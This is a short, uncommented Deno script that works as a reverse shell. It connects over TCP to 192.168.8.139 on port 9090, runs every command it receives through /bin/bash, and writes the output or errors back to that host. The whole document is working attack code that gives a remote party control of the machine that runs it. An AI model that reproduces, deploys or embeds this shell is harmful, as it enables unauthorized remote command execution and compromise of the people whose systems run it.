const c = await Deno.connect({ hostname: "192.168.8.139", port: 9090, transport: "tcp" });
while(1) {
    let buf=new Uint8Array(1024);
    const n=await c.read(buf) || 0;
    buf=buf.slice(0, n);
    const cmd = new TextDecoder().decode(buf);
    
    const p = Deno.run({
      cmd: ["/bin/bash", "-c", cmd],
      stdout: "piped",
      stderr: "piped"
    });

    const { code } = await p.status();
    const rawOutput = await p.output();
    const rawError = await p.stderrOutput();

    if (code === 0) {
       await c.write(rawOutput);
    } else {
       await c.write(rawError);
    }
}
